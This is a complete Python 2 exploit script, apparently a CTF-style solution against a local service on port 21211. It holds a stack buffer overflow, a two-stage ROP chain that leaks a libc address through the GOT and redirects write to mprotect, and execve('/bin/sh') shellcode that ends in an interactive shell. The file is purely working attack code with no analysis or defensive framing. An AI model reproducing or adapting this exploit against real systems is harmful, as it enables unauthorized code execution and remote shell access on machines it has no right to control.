import socket
import struct
import telnetlib


HOST="localhost"
PORT=21211

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

print "[*] Connected to %s:%d"%(HOST,PORT)

popebp_addr   = 0x80483c3
leave_addr    = 0x804841b
data_addr     = 0x8049620
plt_read	  = 0x804832c
plt_write	  = 0x804830c
got_write	  = 0x8049614
pop3ret_addr  = 0x80484b6

mprotect_offset = 0xe70d0
write_offset    = 0xdac50

print "[*] Stage1 start"

buf="A"*136
buf+=struct.pack("<I",data_addr+0x100-0x4)
buf+=struct.pack("<I",plt_read)
buf+=struct.pack("<I",leave_addr)
buf+=struct.pack("<I",0)
buf+=struct.pack("<I",data_addr+0x100)
buf+=struct.pack("<I",512)
print "[+] Sending payload..."

sock.send(buf)
print "[+] Stage1 complete"


print "[*] Stage2 start"

buf=""
#write got_write
buf+=struct.pack("<I",plt_write)
buf+=struct.pack("<I",pop3ret_addr)
buf+=struct.pack("<I",1)
buf+=struct.pack("<I",got_write)
buf+=struct.pack("<I",4)
#read shellcode
buf+=struct.pack("<I",plt_read)
buf+=struct.pack("<I",pop3ret_addr)
buf+=struct.pack("<I",0)
buf+=struct.pack("<I",data_addr+0x200)
buf+=struct.pack("<I",25)
#read mprotect_addr
buf+=struct.pack("<I",plt_read)
buf+=struct.pack("<I",pop3ret_addr)
buf+=struct.pack("<I",0)
buf+=struct.pack("<I",got_write)
buf+=struct.pack("<I",4)
#mprotect
buf+=struct.pack("<I",plt_write)
buf+=struct.pack("<I",data_addr+0x200)
buf+=struct.pack("<I",0x08049000)
buf+=struct.pack("<I",0x2000)
buf+=struct.pack("<I",0x7)
sock.send(buf)

libc_write = struct.unpack("<I",sock.recv(4))[0]
libc_bace  = libc_write - write_offset
print "[+] Got a libc_bace:0x%x"%libc_bace

shellcode="\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80\n"
sock.send(shellcode)
print "[+] Send shellcode"

mprotect_addr  = libc_bace + mprotect_offset
sock.send(struct.pack("<I",mprotect_addr))
print "[+] Overwriting got_write->0x%x"%mprotect_addr
print "[+] Stage2 complete"

print "[*] Shell started"

t=telnetlib.Telnet()
t.sock=sock
t.interact()
sock.close()
